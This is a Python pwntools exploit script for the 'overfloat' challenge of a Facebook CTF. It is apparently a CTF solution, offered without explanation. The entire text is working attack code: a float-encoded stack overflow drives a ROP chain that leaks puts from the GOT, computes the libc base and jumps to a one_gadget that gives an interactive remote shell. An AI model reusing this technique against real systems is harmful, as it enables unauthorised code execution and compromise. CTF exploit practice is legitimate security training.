from pwn import *
import struct

putsPlt = 0x400690
putsGot = 0x602020
popRdi = 0x400a83

#start = 0x400a20
start = 0x400993
oneShot = 0x4f2c5
#oneShot = 0x4f322
#oneShot = 0x10a38c

pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]


target = remote("challenges.fbctf.com", 1341)
#target = process('./overfloat')

#gdb.attach(target)


def sendVal(x):
    v1 = x & ((2**32) - 1)
    v2 = x >> 32
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

for i in xrange(7):
    sendVal(0xdeadbeefdeadbeef)

#sendVal(0x3030303030303030)
sendVal(popRdi)
sendVal(putsGot)
sendVal(putsPlt)
sendVal(start)

target.sendline('done')

print target.recvuntil('BON VOYAGE!\n')

leak = target.recv(6)
leak = u64(leak + "\x00"*(8-len(leak)))
base = leak - 0x809c0

print hex(base)

for i in xrange(7):
    sendVal(0xdeadbeefdeadbeef)

sendVal(base + oneShot)

target.sendline('done')



target.interactive()
